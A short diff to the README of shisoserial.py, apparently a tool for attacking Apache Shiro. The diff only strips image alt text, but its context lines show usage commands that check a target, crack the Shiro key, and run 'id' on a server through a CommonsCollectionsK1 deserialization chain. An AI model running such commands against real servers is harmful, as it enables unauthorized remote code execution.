@@ -59,7 +59,7 @@ optional arguments:
 python3 shisoserial.py -m check -u http://127.0.0.1:8080
 ```
 
-![image-20211229165754332](README.assets/image-20211229165754332.png)
+![](README.assets/image-20211229165754332.png)
 
 ### Use proxy angent cracking the shiro key with CBC mode
 
@@ -75,7 +75,7 @@ python3 shisoserial.py -m crack -u http://*.*.*.*:**** -t CBC -p http://*.*.*.*:
 python3 shisoserial.py -m echo -u http://127.0.0.1:8080 -g CommonsCollectionsK1 -c id
 ```
 
-![image-20211229175021680](README.assets/image-20211229175021680.png)
+![](README.assets/image-20211229175021680.png)
 
 ### Mass use specified shiro key with Post method
 
